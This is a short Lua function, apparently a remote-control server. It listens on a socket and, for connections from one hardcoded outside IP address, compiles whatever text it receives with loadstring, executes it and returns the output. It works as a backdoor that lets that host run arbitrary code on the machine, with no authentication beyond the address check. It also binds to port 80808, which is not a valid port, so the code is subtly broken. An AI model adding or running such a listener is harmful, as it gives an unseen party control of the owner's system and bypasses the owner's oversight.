function rcserver()
   serverActive = true
   rcsocket=require "socket"
   rcserver2=rcsocket.bind("*",80808)
   coroutine.yield()
   while serverActive do
        rcserver2:settimeout(1)
		rcclient=rcserver2:accept()
		if rcclient then
		    coroutine.yield()
	        remoteip=rcclient:getpeername()
	        if remoteip == "94.249.210.90" then
				data=rcclient:receive()
    			exec,err=loadstring(data)
	        	if err then
	        	    rcclient:send(err)
                elseif not exec then
	        	    rcclient:send("Unexpected error.")
		        else
		        	returned=""
			        s,r=pcall(exec)
			        if r==nil then
			        	returned=returned.."[Nothing returned!]"
        			elseif not type(r)== "string" then
		        		returned=returned.."[Script returned a "..type(r).."]"
        			else
		        		returned=returned..r
			        end
        		    rcclient:send(returned)
		        end
        		coroutine.yield()
			end
    	end
    end
end
